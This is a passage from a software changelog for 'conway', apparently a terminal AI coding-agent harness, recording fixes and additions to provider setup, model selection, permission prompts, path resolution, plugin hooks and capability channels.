# Changelog

All notable changes to **conway** are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **Ollama's context window is now actually requested, not merely assumed — and never invented** — board item `01M1AZYHQS8155SPVKSFHHWE7N`, operator-directed ("this should be configurable, but should have a default to the max size allowed by the provider... conway must REQUEST the window it intends to use"). conway never sent Ollama's `num_ctx`; Ollama Cloud's own OpenAI-compatible `/v1/chat/completions` was confirmed (2026-08-30) to silently IGNORE a passed `options.num_ctx` regardless, so a real fix required routing through its NATIVE `/api/chat` (`crates/conway-plugin-backends/src/openai_compat/ollama_native.rs`, a genuine second wire format — different response envelope, NDJSON streaming instead of SSE, `arguments` as a real JSON object instead of a string) whenever a real context window has actually been resolved. `Profile` gains `sends_num_ctx` (which dialect can express this at all — `ollama` only) and `context_window_verified` (whether a dialect's own baseline `max_context_tokens` is a real, sourced figure — `openai`'s `128000` is, every other built-in's `32768` never was); `ContextTokensSource` gains `Unverified` for exactly the unsourced case, replacing what used to be silently folded into `DialectDefaultFloor`. **No generic 200,000-token fallback was added** — proposed and explicitly rejected by the operator ("we don't want to pick an arbitrary number"); the existing `32768`/`128000` per-dialect floors are unchanged, only their *provenance* is now honestly distinguishable. At provider setup (guided first-run AND `/settings` → providers → add, through one shared primitive, `conway_plugin_backends::probe::discover_context_window`), conway attempts live discovery (Ollama's native `POST /api/show`) and surfaces a successful result as a copy-pasteable `.conway/models.json` snippet — persisting it automatically, and asking when discovery fails, are disclosed follow-ups: no per-model override channel reaches a `[backends.<id>]` entry for `"openai-compat"` today. `glm-5.2`'s bundled context window is corrected from the previous `1,000,000` estimate to the provider's own precisely-reported `1,048,576` (`POST /api/show`, confirmed live). See `docs/providers.md`'s "Where a context ceiling comes from" / "Establishing the window at setup" / "Requesting the window: `num_ctx`" sections for the full precedence chain and every decision's own rationale and rejected alternative.

- **`/model` bare now lists what's configured — a menu with `conway.ui`, plain text without** — board item `01M1A35S609TZ613GAECPEHX8D`, operator-directed ("running `/model` bare should list available models. If `conway.ui` is present, it should be a menu"). Bare `/model` used to be a `ParseError` naming the usage form; it now lists every `"backend/model"` pair any operator-configured role's `chain` names (`AppState::configured_models`, refreshed from the merged config on the same seam `/settings` already refreshes on), marking the focused agent's own current model `(active)` — comparison, not just discovery, and never a remote provider-API roster. With `conway.ui` installed, this is a menu (`Mode::UiForm`, the SAME surface a model-called `ask_question` opens — its second real consumer, not a second implementation); without it, plain transcript text, which is the MAIN path (`conway.ui` is opt-in and absent by default), not a fallback. Any pair shown either way is accepted verbatim by `/model <pair>` — the actual switch is factored into one `commands::apply_model_switch`, called identically whether the pair came from typing `/model <pair>` or from answering the menu. Does **not** add a `default_model` scalar or make the settings default-model row settable — decision `01M18A67J8D7B8HN17K44JGQG4` (default model stays a derived read over `roles.<default_role>.chain`) is unchanged.
- **"Deny with feedback" now actually collects feedback** — board item `01M1A9M2EVJNR0HBN86A8E40EA`. The permission prompt's `[Esc] deny with feedback` used to send a single hardcoded message ("user declined; try another approach") with no way to type a reason — the channel to the model already existed end to end (`PermissionDecision::DenyWithFeedback` → the model's own tool-result error text), but the collection step never did, so the control claimed a capability it didn't have. `Esc` now opens a text entry (`Mode::EditingDenyFeedback`); `Enter` delivers what you typed (falling back to the old wording when left blank, so a quick "just deny" is still one `Esc`-then-`Enter`); a second `Esc` cancels back to the prompt, undecided.
- **An error raised while `/settings` is open is no longer hidden behind the menu** — same board item. The settings menu is bottom-anchored and content-sized; it used to draw its `Clear`+border directly over the transcript's own tail, so a freshly-appended error landed exactly where the menu covered it and stayed invisible until the menu closed. `view::mod::layout` now reserves the menu's own height out of the transcript pane ahead of drawing (`settings::modal_rect`), pushing content up instead of painting over it. The other five bottom-anchored surfaces (the permission prompt, `/ask`, the intent-confirm/trust-preview cards, `ask_question`'s modal) were audited and share the same underlying `Clear`-and-cover mechanism, but are DECISION-owed and transient rather than something an operator leaves open across background activity — left as they were, named as a candidate follow-up rather than folded in silently.
- **`Up`/`Down` at the input line: decided, not accidental** — same board item. Bare `Up`/`Down` still move the cursor within a multi-line draft, then scroll the transcript one line once at an edge (history recall stays on `Ctrl-P`/`Ctrl-N`) — checked against the convergence test (`docs/vision/DESIGN-surface-coherence.md` §8) against Claude Code, OpenCode, and Pi, all three of which converge on Up/Down recalling history at the edge. Kept diverging anyway, on the record: all three either don't take over the terminal's alternate screen the way conway's TUI does, or accept mouse capture (and build their own click-drag text selection) to resolve the same wheel-vs-keystroke ambiguity DECSET 1007 creates — conway chose to keep the terminal's native, zero-cost text selection instead, and matching the key without the mechanism underneath it would reintroduce the exact regression an earlier revision already shipped and reverted. Documented as deliberate in `docs/interactive.md` rather than left looking like an oversight.

### Added

- **conway now has its own standing instructions for an agent working in this repository** — board item `01M1FS3MQTZ6QSVE9PFCAZ7KR5`. `.conway/instructions.md` (tracked despite `.conway/`'s allowlist-style `.gitignore`, alongside `permissions.json`/`settings.json`/`agents/`) is read by `conway.idiom`'s existing `IdiomPlugin::from_operator_files` project-scope resolution (`crates/conway-plugin-idiom/src/lib.rs`) the same way any operator's own project file is — no plugin change. Covers how to verify a change here (`cargo test -p <crate>`, the `scripts/check-fast-gates.sh` doc gate, and reporting a change unverified when `bash` is not in the session's tool set), commit-message AI-attribution (`CLAUDE.md`), declaration honesty (`CONTRIBUTING.md` §2), the two places config defaults live (`crates/conway/src/config/schema.rs`'s `impl Default` blocks and `default_document` in `crates/conway/src/config/merge.rs`), the `PHILOSOPHY.md`/`docs/`/board doc split, never editing outside the repository, and preferring `assert_cmd` tests for operator-visible behaviour.

- **Ollama Cloud joins the first-run guided-setup menu as a third hosted choice, alongside Anthropic and OpenAI** — board item `01M19XZPZD5CKRB83JJS42E8JN`, operator-directed ("Ollama Cloud should be in the path... it is critical that we can use cloud models"). New `crates/conway-cli/src/first_run.rs::HOSTED_CHOICES` entry (`id: "ollama_cloud"`): `kind: "openai-compat"`, `dialect: "ollama"` — **not** `"openai"`, settled by the operator's own working `~/.conway/settings.json` (archived 2026-08-13, two `.bak` copies) rather than guessed — `base_url: "https://ollama.com/v1"` (confirmed live 2026-08-30: `GET /v1/models` returns 200 with a real roster, `/v1` and not `/api/v1`; **not stated in `docs.ollama.com`'s own prose**, which documents only the local `http://localhost:11434/v1` form), `credential_env: "OLLAMA_API_KEY"` (`docs.ollama.com/api/authentication`, `Authorization: Bearer`). `default_model` is `glm-5.2`, deliberately not the smaller `gpt-oss:20b` that a plain "smallest in the roster" heuristic would pick: `glm-5.2` is the model `conway-plugin-backends`' `openai_compat::wire` module was actually debugged against (its `assistant_message` builder sends `content: ""`, never `null`, on a tool-call-only turn specifically because Ollama Cloud's `glm-5.2` rejects `null` there with `bad request: invalid message content type: <nil>`, failing every tool-continuation request) — a first-run default that hits an unhandled dialect quirk on a new user's first tool call is the worst possible first impression, and `gpt-oss:20b` has never been through this wire layer at all. Both credential shapes the flow already supports work unmodified: `resolve_credential_plan`/`backend_entry_json` are generic over every `HOSTED_CHOICES` entry, so `ollama_cloud` reuses `OLLAMA_API_KEY` in one keystroke when already exported (`CredentialSource::EnvVar`) or prompts for a literal key otherwise (`CredentialSource::Literal`) exactly like Anthropic/OpenAI already did — proven, not merely inherited, by two new dialect-specific unit tests plus a new compiled-binary test (`first_run_a_provider_configured_via_api_key_env_actually_completes_a_turn`) that resolves an `api_key_env`-shaped entry through a real `conway` subprocess and completes a real turn against a mock server, with the credential scoped to the child process only (never `std::env::set_var` in the test's own process, which would race other test threads reading real process env). `ProviderChoice`'s own doc comment is corrected in full (not appended beneath): the admissibility rule it actually encodes is "a hosted choice needs no extra question" (a known `kind`, `base_url`, and `default_model`), not a hard cap of two — the original two-entry list was `conway-plugin-backends`' whole roster at the time it was written, not a ceiling. `conway-plugin-backends::openai_compat::probe_impl`'s three-tier Ollama liveness fallback (`/models` → `/api/tags` → `/api/version`) keeps its original rationale comment (real Ollama Cloud deployments once 404'd on both `/models` and `/api/tags`) but adds the 2026-08-30 finding that both now return 200 live against `https://ollama.com/v1` — the fallback is kept regardless, deliberately, as defence against a regression or a differently-behaving deployment, not because both tiers are still known-dead; both dated observations are recorded rather than the stale one being silently dropped. `docs/getting-started.md`'s "Configure a provider" section and `docs/providers.md` (a new "Ollama Cloud" subsection, and the `/settings` providers-section paragraph, corrected from "two shapes" to "three") describe the new choice; `docs/manual-test-plan.md`'s Part 1 (two hosted choices → three) and Part 2.1 ("not a guided path" → is one now) are corrected to match, since both would otherwise describe a gap this item closes.

### Documented

- **Two small correctness debts the audit named: an untested two-hook interaction, and a field promising a discovery surface that does not exist** — board item `01M0XREWGA03EDQ5PK2C18KW75`, two unrelated fixes. First: `crates/conway-runtime/src/permission.rs`'s `pre_tool_use` hook step correctly lets a hook that defers-on-failure (`HookOnFailure::Prompt`, its runner failing) fall through to the next installed hook rather than short-circuiting the loop, so a LATER hook's outright refusal still wins — but every existing test in that module installed exactly one hook, leaving the two-hook interaction the guarantee is actually about unpinned (finding `01M0XQBTW4JMS7XQESDMS3KNZY`). New test `a_second_hooks_outright_refusal_still_wins_after_an_earlier_hooks_deferred_outage` installs two hooks (one deferring-on-failure and failing, one refusing outright) behind a new `PerCommandHookRunner` test double (a `HookRunner` that answers differently per invocation, needed because the broker holds one shared runner for every installed hook) and asserts `Deny`, not merely a forced trip to the operator's gate. Second: `EventDecl::summary`'s doc comment claimed a discovery purpose — "how does an operator discover what is hookable" — it does not serve: unlike `Plugin::commands`, whose `CommandSpec`s reach the slash palette and `/help`, no code in `crates/conway-cli` reads a declared event or its summary, and the one production call site (`crates/conway/src/builder.rs`'s plugin-event validation pass) reads only `EventDecl::carries_tool_name`, never `summary` (finding `01M0XQGR9RR3DVFWN8WBKWVGEY`, pre-existing). The doc is corrected to say plainly that no discovery surface consumes the field yet, naming what one would be (a `/plugin` row or `/help` section) — no discovery surface was built; that is separate, future work.

- **Seven-going-on-more stale documentation claims about the plugin capability vocabulary and the plugin status render path are corrected** — board item `01M0XKP5BWCPY3BHPJZHXKR4H3`. `docs/plugins/concepts.md`, `trust-and-security.md`, `hooks.md` (two separate locations: the `required_host_caps` point and the page's own opening summary), and `subprocess-plugins.md` no longer describe `HostCapability` as a closed two-variant enum — it opened to a shape-checked `Named(String)` catch-all under board item `01M0WWKA8K1E7JPK87J6RRQMZF` — and now state precisely which failure mode still fails closed AT PARSE (a malformed tag) versus which now resolves and is refused later at the host-capability GATE (a well-formed but previously-unknown tag); `crates/conway-plugin-subprocess/src/wire.rs`'s own `required_host_caps` doc comment gets the identical, surgical correction, since a vague rewrite there would be worse than the half-truth it replaces. `hooks.md`'s `status.declare/1` row and its own opening summary no longer claim nobody renders a plugin's pushed status — the TUI render path and startup snapshot population both shipped (board item `01M0X1B7Z41J57N6YP2JFZ2AZW`) and are now cited by file — while the row's separate, still-true TTL-expiry claim (no sweep runs) is left untouched, verified independently rather than blessed by association. `docs/plugins/claude-compat.md`'s "What works, fully, end to end" section no longer claims MCP is the only kind this layer wires to run: hooks and commands both dispatch now too, without restating either bullet's own fidelity caveats (payload-shape, best-effort) that page's coverage section already states. No behaviour change: docs and one doc comment only.

### Fixed

- **Guided setup now writes a config that can actually route — before this fix, EVERY completed guided run left `default_role`/`roles` unset and a real prompt afterward failed loud, "routing error: no candidate for role default (0 considered)"** — board item `01M1A2HKMDGNK961ZFV1EGZDQ0`, found by the operator on a real virgin walk, both paths (local-detected and hosted-menu-plus-key), every time. `finish_setup` (`crates/conway-cli/src/first_run.rs`) used to call only `conway::config::set_backend_provider`, writing `backends.<id>` and nothing else; `default_role` therefore fell through to `conway::config::merge`'s baked-in validation floor (`default_role: "default"`, `roles.default.chain: []` — present only so an unconfigured file still parses, never meant to route anywhere), which is exactly what `verify_backend`'s own SEPARATE, throwaway in-memory config with a real one-entry chain had just proven works — the write and the verification had silently diverged. Fixed with two new `conway::config` writers, both exercising the SAME splice-not-reserialize discipline every existing writer in that module already follows: `ensure_default_role` (inserts the `default_role` key when the file has never had one — the one precondition the narrower, pre-existing `set_default_role` deliberately refuses to invent) and `set_role_chain` (creates `roles`/`roles.<role>`/`roles.<role>.chain` three levels deep as needed, replacing the whole array each call rather than appending). `finish_setup` now calls both, under one new shared `chain_entry(id, model)` formatter also used by `verify_backend`'s own chain construction, so the two can never re-diverge (one implementation of the `"backend/model"` shape, not two). **`run_guided_setup` now loops**: after every successful `finish_setup`, it asks `Add another provider? [y/N]` — declining (the default, zero added keystrokes for the single-provider case) reproduces today's outcome with a working chain instead of a broken one; accepting loops back to the hosted menu and a SECOND provider lands in the persisted chain after the first, in the order added, so a first provider's own runtime failure now falls through to a real second candidate instead of failing outright. The local-offer prompt's wording is corrected to match its own behavior (`Esc` skips the WHOLE flow; only a truly different key browses hosted providers instead — the old wording lumped both under "any other key"). `crates/conway/src/config/merge.rs`'s baked-in role-floor doc is updated to state, now that a real chain can reach it, exactly what still needs the floor (an entirely unconfigured document validating at all) versus what used to lean on it by accident (guided setup's own output, now fixed at the writer). Tested end to end: `finish_setup` (now `pub`, for exactly this reason — it touches the terminal only on its own failure path) is driven directly against a real mock backend, the resulting FILE is read back and asserted to carry both `default_role` and `roles.default.chain`, and a SEPARATE `ConwayBuilder::from_config_only` build from that same file completes a real turn — deliberately never reusing `verify_backend`'s own construction, since that reuse is the exact gap being closed. A second test configures two providers in one run and asserts both backends and a two-entry chain, in order; new `conway::config::writer` unit tests cover `ensure_default_role`/`set_role_chain` in isolation (fresh-file creation, in-place replacement, no-op-when-unchanged, and byte-for-byte preservation of a hand-edited file's unrelated sections). `docs/getting-started.md`'s guided-setup paragraph and `docs/manual-test-plan.md`'s Part 1 are corrected: the latter's old claim that a first run always shows the hosted menu alongside the local probe was independently wrong — a successful local probe short-circuits the hosted menu entirely — and gains rows for the add-another loop and for actually completing a turn afterward.

- **`/settings`' "default role" cycle list no longer offers a role nobody configured** — follow-up to board item `01M18Q7P25DTSKQJDJJCC3E800`. `app/defaults.rs::refresh_default_entries` populated `AppState::known_role_names` straight from `merged_document`'s `roles` map, which always carries `conway::config::merge::default_document`'s baked-in `"default"` role floor (an empty chain, no overrides — present at the merge's lowest layer purely so an unconfigured `default_role` still validates). An operator with real roles `coder`/`reviewer` and no role of their own named `default` saw a THIRD entry in the cycle list they never declared, with an empty routing chain — selecting it as the session's new default would leave a fresh session unable to route at all, silently. New `conway::config::is_baked_in_role_floor` (`crates/conway/src/config/merge.rs`) names the floor precisely — the literal name AND an empty `RoleEntry` — so an operator who deliberately declares their own role literally named `"default"` with real content is unaffected; `refresh_default_entries` now filters it out before building `known_role_names`. `docs/interactive.md`'s existing "cycles it through every role your `[roles]` config declares" wording already described the fixed behavior; the implementation now matches it.

- **A leading `~` in a tool's path argument is now expanded, instead of being passed through literally and denying every reference to the operator's home directory** — board item `01M10HSENWKTEE4G691XJXBH6T`, found dogfooding `/beepboop:config`'s own `find ~/.claude/plugins/... | sort -V | tail -1` first line: the model read `~/.claude/...` as a path, the tool read it as a literal directory named `~`, and the resulting "could not be found" gave the model nothing to diagnose — it apologised and asked the operator to confirm the path rather than naming what was actually wrong. Fixed in the one shared resolver every fs/shell tool path argument (and every `paths_under` permission-rule prefix) already goes through, `conway_core::containment::resolve_candidate` (one implementation of safety-critical path resolution, never restated at a second callsite) — landing it there, rather than at either of its two thin per-crate wrappers (`conway_tools::common::resolve_path`, `conway_runtime::permission::resolve_like_the_tool_will`), is what keeps a `~`-prefixed permission-rule prefix and the call argument it bounds resolving identically (a permission rule and the call it bounds must never disagree about where a boundary sits). Expansion is **anchored, never a substring replace**: only exactly `~` (the bare home directory) or a leading `~/` are recognised; a `~` anywhere else in an argument — an ordinary filename character, or the middle of a later path component — is left untouched. A path beginning with `~` that conway cannot honour — no home directory could be determined, or a `~user`-style form this crate does not expand (INTENT.md §8.3: refuse and name what changed, rather than guess) — is refused with a new, typed `conway_core::containment::ResolveError::UnresolvableTilde`, whose message names tilde explicitly, reaching the model instead of a generic "not found". `resolve_candidate`'s return type changes from `Option<PathBuf>` to `Result<PathBuf, ResolveError>` (`ResolveError::NulByte` replacing the old, untyped NUL rejection); every call site across `conway-tools`, `conway-runtime` (`subagent.rs`'s spawn-time root resolution, `runtime/root.rs`'s root-agent resolution, `artifact_store.rs`'s artifact-name resolution, and `PermissionBroker`'s own `paths_under`/root-check consumers) is updated to match, preserving each site's own pre-existing NUL-specific wording where a test pinned it and naming the new tilde reason everywhere else. Home-directory lookup reuses the `directories::BaseDirs` crate already resolved in `Cargo.lock` (via `conway`'s own `~/.conway/settings.json` discovery) rather than a hand-rolled `$HOME`/`%USERPROFILE%` read — one home-directory answer across the tree, and an env-var override (`HOME`/`USERPROFILE`) already used to simulate a home directory in this tree's own isolation tests observes it too. Tested at three layers: `conway-core`'s own unit tests (exact-equality expansion of `~`/`~/`, and the discriminating case — a `~` mid-path or mid-filename resolving to the EXACT literal path a substring-replace bug would get wrong, not merely "resolves to something"); `conway-tools`' `resolve_path`/`ReadTool::invoke` tests (the same cases reaching the tool's own production entry point, plus the named-tilde-in-the-error assertion); and a new `crates/conway-cli/tests/tilde_expansion.rs`, driving the real compiled binary and a real `read` tool call end to end, with `HOME`/`USERPROFILE` overridden only on the spawned child process (never this test binary's own, so it cannot race any other test's environment) — one test proving `~/target.txt` reaches a simulated home directory's real file, one proving an unsupported `~bob/...` form's denial names tilde in the text that reaches the model. `docs/tools.md` gains a "Tilde expansion" section (cross-referenced from `docs/permissions.md`'s `paths_under` description) documenting the anchoring rule and the named-refusal cases. **Delegated, not claimed done**: re-running `/beepboop:config` itself end to end needs a live interactive session this change cannot drive; separately, `beepboop`'s own command body names a stale cache path (a pre-existing bug in that plugin, unrelated to this fix, disclosed rather than silently patched around).

- **A translated `SubagentStart` hook no longer fires on every `/ask` — behavior change for every installed Claude Code plugin with one** — board item `01M129Y98V4C1050QBPPMY37X0`. Conway creates a child agent in one of two modes: `Spawn` (a clean child with no ancestry — the shape Claude Code's own Task tool creates, and the shape a plugin author writing a `SubagentStart` hook is picturing) and `Fork` (the current conversation continues in a child that inherits its context — the shape `/ask`, both the modal command and the `conway_ask` tool, use). `conway_plugin_claude::hooks::EVENT_MAP` translated `SubagentStart` onto conway's own `child_spawned` event by NAME alone, and `child_spawned` fires for BOTH modes at the single `SubagentHost::start` call site both share — so a plugin's `SubagentStart` hook fired every time the operator used `/ask`, a thing its author never had in mind (for `beepboop` specifically: an audible sound on a keystroke that is not "starting a subagent" to the operator at all). Fixed with data already being sent to the hook and previously discarded: `child_spawned`'s own dispatch payload always carried `"mode"` (`SubagentMode::{Fork,Spawn}`); new `conway_core::ports::PluginHookRule::spawn_only` (mirrored by `conway_runtime::hook_dispatch::HookSpec::spawn_only`, read by `HookDispatcher::dispatch`'s own per-hook filter) narrows a hook to only the `Spawn` occurrences, and `conway_plugin_claude::HookRegistration::spawn_only` is `true` for exactly the one translated rule that needs it (a `SubagentStart` mapping). **conway's own `child_spawned` event is unchanged** — it still fires for both modes, unconditionally, at the same call site; an operator-authored `[hooks].rules[]` entry, or any other plugin's own `child_spawned` subscription, still sees every child, fork included, exactly as before. Considered and rejected: leaving the mapping `approximate` and only improving its disclosure — that would have kept the operator-visible bug in exchange for clearer wording, a worse outcome once the fix was this cheap. `SubagentStart` -> `child_spawned` moves out of `conway_plugin_claude::hooks::APPROXIMATE_CLAUDE_EVENTS` (it is now exact); `SubagentStop` -> `child_reported` stays in it, unchanged and un-narrowed on purpose — its own divergence (firing for a supervisor-synthesized terminal result, not just an ordinary completion) has no discriminating field in `child_reported`'s payload the way `child_spawned`'s `"mode"` already did, and narrowing it would cost a plugin exactly the crash/timeout visibility it is most likely watching for. `docs/plugins/claude-compat.md`'s coverage table and its own divergence writeup are updated to match; `crates/conway-plugin-claude/tests/hooks_dispatch.rs` and `crates/conway-cli/src/claude_compat_plugins.rs` gained end-to-end coverage driving a real `Fork` and `Spawn` through `SubagentHost::start`.

- **An operator can now tell what a foreign plugin's hooks can do to them** — board item `01M0XRD8VMWD273W0W51T8ECCM`, two defects, one outcome. First: `crates/conway-cli/src/claude_compat_plugins.rs`'s deny-capable/observation-only split used to hardcode `"pre_tool_use"` as conway's ONLY deny-capable event, missing `prompt_submitted` (`conway_runtime::hook_dispatch::PROMPT_SUBMITTED`, dispatched via `HookDispatcher::dispatch_deny_only` — the event a translated `UserPromptSubmit` hook maps to) — so a foreign plugin whose only hook was `UserPromptSubmit` could deny every prompt the operator typed, reported only on the verbose-gated channel, invisible at default verbosity. Fixed by reading a new canonical `conway::DENY_CAPABLE_EVENTS` (the facade's own two-event set, already established by `Conway::active_deny_capable_hook_rules`) rather than re-declaring the pair a second time. Second: the `/plugin` browser still rendered mapped hooks as `"(not wired)"` — true when written, false since a same-day sibling item made every mapped hook a real, dispatchable `[hooks].rules[]` entry; `crates/conway-cli/src/tui/view/plugins.rs`'s claude-compat row now says hooks dispatch and names how many are deny-capable vs observation-only (`ClaudeCompatPluginEntry::deny_capable_hook_count`, `crates/conway-cli/src/tui/state.rs`), and that struct's own doc no longer claims a mapped hook is merely "informational."
- **A plugin's `requires` edge, satisfied by a provided capability, is now actually reachable at runtime** — board item `01M0XXWV3BVDM6Y646WMEBTYT1`, closing the gap `01M0WWNHQQYN1EVTH8WPZ33EBF`'s own report disclosed. Before this item, `crates/conway-runtime/src/tools/runner.rs`'s one production `ToolCtx` construction site bound `capabilities: CapabilityCallHandle::noop(..)` unconditionally: `ConwayBuilder::build` correctly resolved a `requires`/`optional` entry as satisfied by an installed plugin's `Plugin::capabilities()` registration, but every LIVE call through `ctx.capabilities` was refused with `NotProvided` regardless — a declaration that resolves as reached while being unreachable, the exact shape declaration-honesty forbids, and the believer here is a third-party plugin author who has no reason to doubt a manifest contract that already builds. Fixed by building a real `conway_core::ports::CapabilityRegistry` ONCE, at `ConwayBuilder::build`, from the SAME `Plugin::capabilities()` iteration `provided_capability_names` already performs, and threading it through a new `RuntimeDeps::capabilities` field into `conway_runtime::tools::runner`'s dispatch seam (`LoopDeps::capabilities` → `ToolBatchCtx::capability_host`), where it now binds a real `CapabilityCallHandle` — still paired with THAT call's own resolved tool's declaring plugin id for `caller_plugin_id` provenance, per-call exactly as the `noop` it replaces already was, never the registry's own owner. `CapabilityRegistry::from_registrations`' duplicate-provider refusal (fail closed, never "last one wins") now reaches `build()` as a real `FacadeError::Build` naming both offending plugins and the capability, rather than risking being swallowed while constructing the registry. Tested end to end through `ConwayBuilder::build` and a real dispatched tool call (`crates/conway/tests/capability_channel.rs`): a call reaching a different plugin's provider and getting its answer, a provider error surfacing as `CapabilityCallError::Provider` distinguishable from `NotProvided`, the `NotProvided` no-provider-installed case surviving as a regression, the duplicate-provider build failure naming both plugins, and `caller_plugin_id` provenance staying bound to the calling tool's own plugin. Out of scope, disclosed rather than silently done: the subprocess wire protocol declaring/forwarding a capability out-of-process (a separate, dependent item) and any unification of this pull-shaped channel with `PluginStatusContribution`'s half-built push case (explicitly left unresolved by `conway_core::ports::capability`'s own module doc).
- **A subprocess plugin can now declare an optional host capability and register a capability provider — the exact gap the entry above disclosed as out of scope** — board item `01M0XXXX3HK8914NE418P5GNRY`. Before this item, `crates/conway-plugin-subprocess/src/wire.rs`'s `WireManifest` carried `required_host_caps` but had no field for `optional_host_caps` (`crate::SubprocessPlugin::discover` mapped it to an unconditional empty `Vec`, a comment naming the gap rather than papering over it) and no field for `provides` at all (nothing let a subprocess plugin register into Edge B, `docs/vision/DESIGN-plugin-dependencies.md` §2, even though the channel was built JSON-in/JSON-out specifically so a pipe could carry it) — so a plugin written in Python was quietly less capable than the identical plugin written in Rust, on the exact mechanism designed to keep them equal. Both gaps close now: `WireManifest::optional_host_caps` is a straight `#[serde(default)] Vec<HostCapability>` mirroring `required_host_caps` byte-for-byte (an existing manifest parses unchanged), now mapped into `PluginManifest::optional_host_caps` and consulted by the SAME `ConwayBuilder::build` degrade-and-announce loop an in-process plugin's identical field already goes through — not a parallel path. `WireManifest::provides` is the SAME `Vec<HostCapability>` type as `required_host_caps`/`optional_host_caps` (one vocabulary, one fail-closed boundary across all three, per this item's own guard rail — reusing `HostCapability::named`'s shape check, itself `conway_core::event_name::validate_event_name`, never a third parser for the same strings); `SubprocessPlugin::capabilities()` (a REAL implementation of `Plugin::capabilities`, not a second registration path) builds one `CapabilityRegistration` per declared name, each backed by a new `SubprocessCapabilityProvider` that forwards a call over this plugin's own existing transport via a new `capability/1` wire point — one-shot (a fresh spawn, mirroring `tool/1`'s one-shot dispatch) or persistent (`PersistentSession::capability_round_trip`, mirroring `tool_round_trip` line for line over the SAME id-correlated NDJSON framing). Dead-child and malformed-response outcomes reuse `tool_round_trip`'s existing fail-closed posture rather than a new one: the identical `SubprocessPluginError::SessionDied`/`TimedOut`/`MalformedFrame`/spawn/nonzero-exit causes, now also projected onto `conway::plugin::CapabilityError` via a new `SubprocessPluginError::into_capability_error` (the SAME error taxonomy `into_tool_error` already projects onto `ToolError`, alternate target type only). Tested in `crates/conway-plugin-subprocess/src/wire.rs`'s own unit tests (both `WireManifest` fields' default/round-trip/malformed/well-formed-unknown parsing, and the `capability/1` result parser's four classification branches) and `crates/conway-plugin-subprocess/tests/capability_channel.rs` (a real child process serving a capability call a DIFFERENT in-process plugin makes through `ConwayBuilder::build`, a declared provider error surfacing as `CapabilityCallError::Provider`, an optional host cap the host lacks degrading and being announced, a dead-mid-call child, and a malformed `capability/1` answer — every one a typed error, never a hang). `docs/plugins/subprocess-plugins.md` documents both fields and the `capability/1` wire shape, including the fail-closed boundary board item `01M0XKP5BWCPY3BHPJZHXKR4H3` sharpened.

- **Declining the first-run guided-setup flow now always leaves conway open, in all three ways there was previously no usable provider** — board item `01M163T1KGX3HTCC2YMDPT655J`, closing a gap the entry above's own predecessor left standing (recorded and ruled on by `01M163TZTM9BF40769FRRVXJ33`/`01M14TBXX10GEJKBQ8AMHX6MPH`). Measured against the compiled binary: declining still exited (code 2) in two of the three entry states the guided-setup trigger can fire from, and open in only the third. **No backends configured at all** exited via `ConwayBuilder::build`'s own `backend_map.is_empty()` hard gate — removed; everything downstream already tolerated an empty map (`CapabilityIndex::from_backends`, both routers' typed `NoCandidate`/`UnknownRole`, `AttemptEngine::execute`'s own previously-unreachable-in-production empty-`req.routes` arm), so an unmodified default's `roles.default.chain = []` now reaches that existing, already-tested `RoutingError::NoCandidate` the moment a turn is attempted, instead of refusing to start. **Every configured backend unusable because a credential variable is unset** ALSO exited, from a completely different, previously undocumented chain of THREE independent gates stacked on the same underlying fact: `crates/conway/src/builder.rs`'s `resolve_api_key` (an unset `api_key_env` was a hard `FacadeError::Config`), `conway_plugin_backends::factory::AnthropicBackendFactory::build`'s own `cfg.validate()` call, and `AnthropicBackend::with_extra_headers`'s own, deeper `config.validate()` call one layer below that — each one relaxed only after the one above it was, since each was independently sufficient to reproduce the identical "declining still exits" symptom. A missing credential now registers the backend anyway (empty-key construction was already `OpenAiCompatBackendFactory`'s behavior; `AnthropicBackendFactory` is now symmetric with it) and fails loud, naming the problem, the first time a turn actually reaches it — Anthropic's own 401/403 classifies as `BackendError::Auth` (pre-existing, tested), never a panic (registering rather than silently excluding the backend from the built routing map is what keeps `AttemptEngine::backend_for` from panicking on a role chain that still names it) and never an empty response. **A dead local endpoint needing no credential** already stayed open before this item and is unchanged. Every test that carried a dummy or dead backend purely to satisfy the now-removed empty-map gate had that workaround removed and, where the removal would otherwise have weakened coverage, replaced with a stronger assertion instead: `crates/conway/tests/builder.rs`'s `build_fails_with_no_backends_configured` and `unset_api_key_env_fails_naming_the_variable` are now `build_succeeds_with_no_backends_configured_and_a_turn_names_no_candidate` and `an_unset_api_key_env_no_longer_fails_the_build_and_registers_the_backend_anyway`, each paired with a new turn-level sibling proving the resulting failure is still loud and named (the latter over a loopback `wiremock` server standing in for Anthropic, never a live credential); `crates/conway/tests/discover_getting_started_example_smoke.rs`'s `unmodified_default_role_still_fails_to_route_with_a_named_no_candidate_error` and `crates/conway-plugin-claude/tests/hooks_dispatch.rs`'s two session-lifecycle tests now register no backend at all rather than an unreached double. One fixture that looked like the same workaround, `crates/conway-cli/tests/config_isolation_binary.rs`, turned out NOT to be one on inspection — removing its declared backend broke both of that file's tests, because an empty `[backends]` table trips a SEPARATE, still-live gate (the first-run trigger's own non-interactive hard refusal, `01M11XVEHNMYY942JE63F7MAFH`) unrelated to `build()`; that file is left with its backend declaration intact and its own doc comment corrected to name the real, previously-undocumented reason. `docs/getting-started.md`'s "Configure a provider" section already said declining "leaves conway usable but unconfigured" — true in wording since the prior item, true in practice only for one of three states until this one; no further edit needed now that the claim holds for all three.

### Changed

- **A plugin can now register a hook directly, and `ConwayBuilder::config_mut` is removed** — board item `01M129QW0GV90QTQS6B3BY3DAR`. Before this item, the ONLY caller that discovered `[hooks].rules[]`-shaped registrations after `ConwayBuilder::from_parts`/`discover` (the claude-compat translation, `crates/conway-cli/src/claude_compat_plugins.rs`) had no dedicated injection seam for them — `with_plugin`/`with_backend`/`with_router` all existed, but nothing did for a hook rule — so it reached into the WHOLE config via `ConwayBuilder::config_mut` and spliced translated rules in as though the operator had typed them, indistinguishable from one the operator actually wrote. New `conway_core::ports::Plugin::hooks() -> Vec<PluginHookRule>` (zero-cost default, every existing implementor compiles unmodified) closes that gap: a plugin declares its hooks the SAME way it declares its tools, on the SAME `with_plugin`/`install_selected` surface every built-in and third-party plugin already shares equally — no privileged, built-in-only channel. `ConwayBuilder::build` folds every installed plugin's `hooks()` into the IDENTICAL `PreToolUseHookSpec`/`HookSpec` lists it already builds from `config.hooks.rules`, so a plugin-registered `pre_tool_use` rule reaches `PermissionBroker::decide`'s hook-check step at the SAME tier a config-declared one 